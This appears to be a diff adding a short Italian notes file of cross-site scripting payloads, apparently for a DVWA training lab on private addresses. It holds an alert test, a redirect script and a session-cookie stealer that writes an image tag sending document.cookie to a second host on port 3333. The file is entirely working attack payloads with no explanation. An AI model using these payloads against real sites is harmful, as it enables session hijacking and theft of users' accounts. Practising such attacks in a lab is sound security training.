@@ -1,0 +1,14 @@
+
+Messaggio
+<script>alert("Sei vulnerabile")</script>
+
+Location
+<script>
+window.location='http://192.168.56.101/dvwa/about.php';
+</script> 
+
+
+Sess ID 
+<script>   
+document.write('<img src="http://192.168.56.102:3333?cookie=' + document.cookie + '">'); 
+</script>
